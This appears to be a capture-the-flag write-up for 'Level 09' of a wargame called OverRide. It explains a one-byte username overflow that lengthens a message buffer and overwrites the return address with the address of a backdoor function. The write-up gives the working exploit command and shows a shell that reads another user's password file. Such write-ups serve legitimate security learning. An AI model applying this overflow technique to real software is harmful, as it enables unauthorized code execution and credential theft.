# Level 09

We can overflow the username by one byte, and luckly this byte will be used as the length of the message, which is set to 140 by default. But if we make it bigger, we can overflow the EIP.

```shell
python -c 'print 10 * "Peer" + "\xff" ' | ./level09 
```

The address of secret_backdoor is `0x00 00 55 55 55 55 48 8c`.
The offset is 200 (thanks to [Our trusty pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)).
The length of offset + address = 208, converted to hex is D0.

Our exploit becomes:
```shell
level09@OverRide:~$ (python -c 'print 10 * "Peer" + "\xd0";print 200 * "B" + "\x8c\x48\x55\x55\x55\x55\x00\x00";print "/bin/sh" '; cat -) | ./level9
"--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, PeerPeerPeerPeerPeerPeerPeerPeerPeerPeer�>: Msg @Unix-Dude
>>: >: Msg sent!"
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
